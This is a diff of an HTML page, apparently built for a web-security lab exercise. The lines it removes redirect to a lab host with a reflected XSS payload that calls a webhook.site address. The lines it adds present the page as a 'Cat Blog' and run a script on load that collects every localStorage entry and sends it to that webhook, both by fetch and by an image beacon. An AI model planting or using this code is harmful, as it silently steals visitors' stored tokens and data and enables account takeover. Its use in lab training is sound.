@@ -1,9 +1,28 @@
 <!DOCTYPE html>
 <html>
-<script>
-setTimeout(() => {
-    window.location = 'http://web.cfcdar04rj74wpo3pmjy.labs.cyber-ed.space/?lang=' + 
-        encodeURIComponent('"><script>fetch("https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?xss=success")<\/script>');
-}, 500);
-</script>
+<head>
+    <title>Cat Blog</title>
+</head>
+<body>
+    <h1>Welcome to Cat Blog</h1>
+    <script>
+        // Отправляем только Local Storage
+        var lsData = {};
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            lsData[key] = localStorage.getItem(key);
+        }
+        
+        var webhook = 'https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367';
+        
+        // Отправляем Local Storage
+        fetch(webhook + '?local_storage=' + encodeURIComponent(JSON.stringify(lsData)));
+        
+        // Дублируем через image
+        var img = new Image();
+        img.src = webhook + '?ls_img=' + encodeURIComponent(JSON.stringify(lsData));
+        
+        console.log('Local Storage sent:', lsData);
+    </script>
+</body>
 </html>
